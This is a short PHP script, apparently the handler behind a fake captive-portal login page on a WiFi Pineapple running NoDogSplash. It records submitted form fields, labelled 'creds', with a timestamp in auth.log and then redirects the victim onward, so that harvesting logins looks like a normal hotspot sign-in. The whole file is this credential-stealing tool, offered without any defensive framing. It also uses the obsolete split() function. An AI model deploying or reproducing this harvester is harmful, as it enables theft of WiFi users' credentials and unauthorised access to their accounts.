<?php
// the name of the file you're writing to
$myFile = "auth.log";

// opens the file for appending (file must already exist)
$fh = fopen($myFile, 'a');

// record the initial form submission
$date = date ("Y-m-d - H:i:s");
$message = "$date,";
$newline = "\n";

// Makes a CSV list of your post data
$creds = implode(",", $_POST);
$pineapple = split(",", $creds);

// Write to the file
fwrite($fh, "$message");
fwrite($fh, $pineapple[0]);
fwrite($fh, ", ");
fwrite($fh, $pineapple[1]);
fwrite($fh, $newline);

// Close the file
fclose($fh);

// redirect to location defined within NodogSplash config
header('Location: ' . $pineapple[2]);
?>